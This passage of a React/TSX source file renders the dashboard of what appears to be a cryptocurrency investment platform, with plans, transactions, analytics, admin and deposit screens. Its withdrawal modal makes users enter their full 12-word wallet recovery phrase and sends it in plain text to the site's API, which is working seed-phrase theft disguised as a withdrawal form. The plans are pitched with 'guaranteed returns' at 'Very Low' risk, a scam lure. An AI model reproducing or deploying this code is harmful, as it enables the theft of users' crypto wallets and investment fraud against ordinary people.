                    </div>
                  </div>
                  <div className="bg-green-500/20 text-green-500 px-3 py-1 rounded-full text-xs font-medium">
                    Available
                  </div>
                </div>
                
                <div className="space-y-3 mb-4">
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Min Investment:</span>
                    <span className="font-semibold">$250</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Expected Return:</span>
                    <span className="font-semibold text-green-500">5-8%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Duration:</span>
                    <span className="font-semibold">12-60 months</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Risk Level:</span>
                    <span className="font-semibold text-green-500">Very Low</span>
                  </div>
                </div>
                
                <div className="bg-[var(--background)]/50 p-3 rounded-lg mb-4">
                  <p className="text-sm text-[var(--foreground)]/70">
                    Secure investments with guaranteed returns and low volatility
                  </p>
                </div>
                
                <button className="w-full bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white py-2 rounded-lg transition-colors font-medium">
                  Learn More
                </button>
              </motion.div>
            </div>
          </motion.div>
        )}

        {activeTab === "transactions" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-6"
          >
            <h2 className="text-2xl font-bold text-[var(--foreground)]">Transaction History</h2>
            
            <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-[var(--background)]/50">
                    <tr>
                      <th className="px-6 py-4 text-left text-sm font-medium text-[var(--foreground)]/60">Type</th>
                      <th className="px-6 py-4 text-left text-sm font-medium text-[var(--foreground)]/60">Amount</th>
                      <th className="px-6 py-4 text-left text-sm font-medium text-[var(--foreground)]/60">Date</th>
                      <th className="px-6 py-4 text-left text-sm font-medium text-[var(--foreground)]/60">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[var(--brand)]/10">
                    {transactions && transactions.length > 0 ? (
                      transactions.map((transaction: Transaction) => (
                        <tr key={transaction.id} className="hover:bg-[var(--background)]/30 transition-colors">
                          <td className="px-6 py-4">
                            <div className="flex items-center gap-2">
                              {transaction.type === 'deposit' && <FaPlus className="text-green-500" />}
                              {transaction.type === 'withdrawal' && <FaMinus className="text-red-500" />}
                              {transaction.type === 'investment' && <FaChartLine className="text-[var(--brand)]" />}
                              {transaction.type === 'profit' && <FaArrowUp className="text-green-500" />}
                              <span className="capitalize">{transaction.type}</span>
                            </div>
                          </td>
                          <td className={`px-6 py-4 font-semibold ${
                            transaction.amount > 0 ? 'text-green-500' : 'text-red-500'
                          }`}>
                            {transaction.amount > 0 ? '+' : ''}{formatCurrency(Math.abs(transaction.amount))}
                          </td>
                          <td className="px-6 py-4 text-[var(--foreground)]/80">{formatDate(transaction.date)}</td>
                          <td className="px-6 py-4">
                            <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                              {transaction.status}
                            </span>
                          </td>
                        </tr>
                      ))
                    ) : (
                      <tr>
                        <td colSpan={4} className="px-6 py-8 text-center">
                          <div className="text-[var(--foreground)]/40">
                            <div className="text-lg mb-2">No transactions found</div>
                            <div className="text-sm">Your transaction history will appear here once you make your first transaction.</div>
                          </div>
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </motion.div>
        )}

        {activeTab === "analytics" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-6"
          >
            <h2 className="text-2xl font-bold text-[var(--foreground)]">Portfolio Analytics</h2>
            
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6">
              <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
                <h3 className="text-lg font-bold text-[var(--foreground)] mb-4">Asset Allocation</h3>
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <FaBitcoin className="text-yellow-500" />
                      <span>Crypto</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span>40%</span>
                      <div className="w-20 bg-[var(--background)] rounded-full h-2">
                        <div className="bg-yellow-500 h-2 rounded-full" style={{ width: '40%' }}></div>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <FaChartBar className="text-blue-500" />
                      <span>Stocks</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span>35%</span>
                      <div className="w-20 bg-[var(--background)] rounded-full h-2">
                        <div className="bg-blue-500 h-2 rounded-full" style={{ width: '35%' }}></div>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <FaChartLine className="text-green-500" />
                      <span>Real Estate</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span>25%</span>
                      <div className="w-20 bg-[var(--background)] rounded-full h-2">
                        <div className="bg-green-500 h-2 rounded-full" style={{ width: '25%' }}></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
                <h3 className="text-lg font-bold text-[var(--foreground)] mb-4">Performance Metrics</h3>
                <div className="space-y-4">
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Sharpe Ratio</span>
                    <span className="font-semibold">1.85</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Max Drawdown</span>
                    <span className="font-semibold text-red-500">-8.2%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Volatility</span>
                    <span className="font-semibold">12.4%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Beta</span>
                    <span className="font-semibold">0.92</span>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {activeTab === "admin" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-6"
          >
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <h2 className="text-xl sm:text-2xl font-bold text-[var(--foreground)]">Admin Panel</h2>
              <Link
                href="/admin"
                className="px-4 sm:px-6 py-3 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg flex items-center gap-2 transition-colors"
              >
                <FaCrown size={16} />
                <span className="hidden sm:inline">Go to Admin Dashboard</span>
                <span className="sm:hidden">Admin Dashboard</span>
              </Link>
            </div>
            
            <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
              <h3 className="text-lg font-bold text-[var(--foreground)] mb-4">Quick Admin Actions</h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                <div className="bg-[var(--background)]/50 p-4 rounded-lg">
                  <div className="flex items-center gap-3 mb-3">
                    <FaUser className="text-[var(--brand)]" size={20} />
                    <h4 className="font-semibold text-[var(--foreground)]">User Management</h4>
                  </div>
                  <p className="text-sm text-[var(--foreground)]/60 mb-3">View, edit, and manage all users in the system</p>
                  <Link
                    href="/admin"
                    className="text-[var(--brand)] hover:text-[var(--brand)]/80 text-sm font-medium transition-colors"
                  >
                    Manage Users →
                  </Link>
                </div>
                
                <div className="bg-[var(--background)]/50 p-4 rounded-lg">
                  <div className="flex items-center gap-3 mb-3">
                    <FaChartLine className="text-green-500" size={20} />
                    <h4 className="font-semibold text-[var(--foreground)]">System Analytics</h4>
                  </div>
                  <p className="text-sm text-[var(--foreground)]/60 mb-3">Monitor system performance and user statistics</p>
                  <Link
                    href="/admin"
                    className="text-[var(--brand)] hover:text-[var(--brand)]/80 text-sm font-medium transition-colors"
                  >
                    View Analytics →
                  </Link>
                </div>
                
                <div className="bg-[var(--background)]/50 p-4 rounded-lg">
                  <div className="flex items-center gap-3 mb-3">
                    <FaCog className="text-[var(--brand)]" size={20} />
                    <h4 className="font-semibold text-[var(--foreground)]">System Settings</h4>
                  </div>
                  <p className="text-sm text-[var(--foreground)]/60 mb-3">Configure system-wide settings and preferences</p>
                  <Link
                    href="/admin"
                    className="text-[var(--brand)] hover:text-[var(--brand)]/80 text-sm font-medium transition-colors"
                  >
                    Configure →
                  </Link>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {activeTab === "settings" && (
          <div className="text-center py-12">
            <h2 className="text-2xl font-bold text-[var(--foreground)] mb-4">Settings</h2>
            <p className="text-[var(--foreground)]/60">Account settings coming soon...</p>
          </div>
        )}
      </div>

      {/* Deposit Modal */}
      {showDepositModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-2xl p-6 max-w-md w-full"
          >
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-[var(--foreground)]">Deposit Funds</h3>
              <button
                onClick={() => setShowDepositModal(false)}
                className="text-[var(--foreground)]/60 hover:text-[var(--foreground)] transition-colors"
              >
                <FaTimesCircle size={24} />
              </button>
            </div>
            
            <div className="space-y-6">
              {/* Amount Input */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">Amount (USD)</label>
                <input
                  type="number"
                  step="0.01"
                  min="10"
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  placeholder="Enter amount (minimum $10)"
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                />
              </div>

              {/* Cryptocurrency Selection */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-3">Select Payment Method</label>
                <div className="grid grid-cols-3 gap-3">
                  {Object.entries(cryptoWallets).map(([key, crypto]) => (
                    <button
                      key={key}
                      onClick={() => setSelectedCrypto(key)}
                      className={`p-3 rounded-lg border-2 transition-all ${
                        selectedCrypto === key
                          ? 'border-[var(--brand)] bg-[var(--brand)]/10'
                          : 'border-[var(--brand)]/20 hover:border-[var(--brand)]/40'
                      }`}
                    >
                      <div className={`text-2xl mb-1 ${crypto.color}`}>{crypto.icon}</div>
                      <div className="text-xs text-[var(--foreground)]/80">{crypto.name}</div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Wallet Address Display */}
              <div className="bg-[var(--background)]/50 p-4 rounded-lg">
                <div className="flex items-center gap-2 mb-2">
                  <span className={`text-lg ${cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].color}`}>
                    {cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].icon}
                  </span>
                  <span className="text-sm font-medium text-[var(--foreground)]">
                    {cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].name}
                  </span>
                </div>
                <div className="text-xs text-[var(--foreground)]/60 mb-2">Send exactly the USD equivalent to:</div>
                <div className="bg-[var(--background)] p-3 rounded border border-[var(--brand)]/20">
                  <div className="text-xs font-mono text-[var(--foreground)] break-all">
                    {cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].address}
                  </div>
                </div>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].address);
                    alert('Wallet address copied to clipboard!');
                  }}
                  className="mt-2 text-xs text-[var(--brand)] hover:text-[var(--brand)]/80 transition-colors"
                >
                  Copy Address
                </button>
              </div>

              {/* Instructions */}
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3">
                <div className="text-sm text-blue-600">
                  <strong>Important:</strong>
                  <ul className="mt-1 space-y-1 text-xs">
                    <li>• Send only {cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].name}</li>
                    <li>• Minimum deposit: $10</li>
                    <li>• Funds will be credited within 24 hours</li>
                    <li>• Keep your transaction hash for reference</li>
                  </ul>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3 pt-4">
                <button
                  type="button"
                  onClick={() => setShowDepositModal(false)}
                  className="flex-1 px-4 py-2 border border-[var(--brand)]/20 text-[var(--foreground)] rounded-lg hover:bg-[var(--background)] transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={() => {
                    if (!depositAmount || parseFloat(depositAmount) < 10) {
                      alert('Please enter a valid amount (minimum $10)');
                      return;
                    }
                    alert(`Deposit request submitted!\n\nAmount: $${depositAmount}\nMethod: ${cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].name}\n\nPlease send the cryptocurrency to the wallet address above.`);
                    setShowDepositModal(false);
                    setDepositAmount('');
                  }}
                  className="flex-1 px-4 py-2 bg-[var(--brand)] text-white rounded-lg hover:bg-[var(--brand)]/80 transition-colors"
                >
                  Submit Request
                </button>
              </div>
            </div>
          </motion.div>
        </div>
      )}

      {/* Withdrawal Modal */}
      {showWithdrawalModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-2xl max-w-md w-full max-h-[90vh] flex flex-col"
          >
            {/* Header - Fixed */}
            <div className="flex items-center justify-between p-6 border-b border-[var(--brand)]/20">
              <h3 className="text-xl font-bold text-[var(--foreground)]">Withdraw Funds</h3>
              <button
                onClick={() => setShowWithdrawalModal(false)}
                className="text-[var(--foreground)]/60 hover:text-[var(--foreground)] transition-colors"
              >
                <FaTimesCircle size={24} />
              </button>
            </div>
            
            {/* Scrollable Content */}
            <div className="flex-1 overflow-y-auto p-6 space-y-6">
              {/* Process Note */}
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3">
                <div className="text-sm text-blue-600">
                  <strong>Withdrawal Process:</strong>
                  <ol className="mt-1 space-y-1 text-xs">
                    <li>1. Enter withdrawal amount</li>
                    <li>2. Select your wallet app</li>
                    <li>3. Enter your 12-word recovery phrase</li>
                    <li>4. Submit request for admin approval</li>
                  </ol>
                </div>
              </div>
              
              {/* Amount Input */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">Withdrawal Amount (USD)</label>
                <input
                  type="number"
                  step="0.01"
                  min="10"
                  max={portfolioData.totalBalance}
                  value={withdrawalAmount}
                  onChange={(e) => setWithdrawalAmount(e.target.value)}
                  placeholder={`Enter amount (max: $${portfolioData.totalBalance.toFixed(2)})`}
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                />
                <div className="text-xs text-[var(--foreground)]/40 mt-1">
                  Available balance: ${portfolioData.totalBalance.toFixed(2)}
                </div>
              </div>

              {/* Wallet Type Selection */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-3">Select Your Wallet App *</label>
                <select
                  value={withdrawalWalletType}
                  onChange={(e) => setWithdrawalWalletType(e.target.value)}
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                  required
                >
                  <option value="">-- Select Your Wallet App --</option>
                  {popularWallets.map((wallet) => (
                    <option key={wallet.id} value={wallet.id}>
                      {wallet.icon} {wallet.name} - {wallet.description}
                    </option>
                  ))}
                </select>
                <div className="text-xs text-[var(--foreground)]/40 mt-2">
                  Choose the wallet app you want to withdraw to
                </div>
              </div>

              {/* 12-Word Phrase Input */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">12-Word Recovery Phrase</label>
                <div className="grid grid-cols-3 gap-2 mb-2">
                  {twelveWordPhrase.map((word, index) => (
                    <div key={index} className="relative">
                      <input
                        type="text"
                        value={word}
                        onChange={(e) => {
                          const newPhrase = [...twelveWordPhrase];
                          newPhrase[index] = e.target.value;
                          setTwelveWordPhrase(newPhrase);
                        }}
                        placeholder={`Word ${index + 1}`}
                        className="w-full px-2 py-2 text-center bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] placeholder-[var(--foreground)]/40 focus:outline-none focus:border-[var(--brand)] text-sm"
                      />
                      <div className="absolute -top-1 -left-1 w-5 h-5 bg-[var(--brand)] text-white text-xs rounded-full flex items-center justify-center">
                        {index + 1}
                      </div>
                    </div>
                  ))}
                </div>
                <div className="text-xs text-[var(--foreground)]/40">
                  Enter each word in the correct order (1-12)
                </div>
              </div>

              {/* Instructions */}
              <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
                <div className="text-sm text-yellow-600">
                  <strong>Important:</strong>
                  <ul className="mt-1 space-y-1 text-xs">
                    <li>• Minimum withdrawal: $10</li>
                    <li>• Maximum withdrawal: ${portfolioData.totalBalance.toFixed(2)}</li>
                    <li>• Processing time: 24-48 hours</li>
                    <li>• Keep your recovery phrase secure</li>
                  </ul>
                </div>
              </div>

            </div>
            
            {/* Fixed Footer with Action Buttons */}
            <div className="p-6 border-t border-[var(--brand)]/20 bg-[var(--card-bg)]">
              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setShowWithdrawalModal(false)}
                  className="flex-1 px-4 py-2 border border-[var(--brand)]/20 text-[var(--foreground)] rounded-lg hover:bg-[var(--background)] transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={async () => {
                    if (!withdrawalAmount || parseFloat(withdrawalAmount) < 10) {
                      alert('Please enter a valid amount (minimum $10)');
                      return;
                    }
                    if (parseFloat(withdrawalAmount) > portfolioData.totalBalance) {
                      alert('Withdrawal amount cannot exceed your available balance');
                      return;
                    }
                    if (!withdrawalWalletType) {
                      alert('Please select a wallet app');
                      return;
                    }
                    if (twelveWordPhrase.some(word => !word.trim())) {
                      alert('Please fill in all 12 words of your recovery phrase');
                      return;
                    }
                    
                    // Get wallet name from popularWallets
                    const selectedWallet = popularWallets.find(w => w.id === withdrawalWalletType);
                    const walletName = selectedWallet ? selectedWallet.name : withdrawalWalletType;
                    
                    // Submit withdrawal request to API
                    try {
                      const response = await fetch('/api/user/withdrawal', {
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                          amount: parseFloat(withdrawalAmount),
                          walletType: withdrawalWalletType,
                          walletName: walletName,
                          recoveryPhrase: twelveWordPhrase.join(' ')
                        }),
                      });

                      if (response.ok) {
                        const data = await response.json();
                        console.log('✅ Withdrawal request submitted:', data);
                        
                        alert(`Withdrawal request submitted successfully!\n\nAmount: $${withdrawalAmount}\nWallet: ${walletName}\nStatus: ${data.status}\n\nYour request will be processed within 24-48 hours.`);
                        
                        setShowWithdrawalModal(false);
                        setWithdrawalAmount('');
                        setWithdrawalWalletType('');
                        setTwelveWordPhrase(['', '', '', '', '', '', '', '', '', '', '', '']);
                        
                        // Refresh user data to show updated balance
                        fetchUserData();
                      } else {
                        const errorData = await response.json();
                        alert(`Failed to submit withdrawal: ${errorData.error}`);
                      }
                    } catch (error) {
                      console.error('❌ Error submitting withdrawal:', error);
                      alert('Failed to submit withdrawal request. Please try again.');
                    }
                  }}
                  className="flex-1 px-4 py-2 bg-[var(--brand)] text-white rounded-lg hover:bg-[var(--brand)]/80 transition-colors"
                >
                  Submit Request
                </button>
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </main>
  );
}
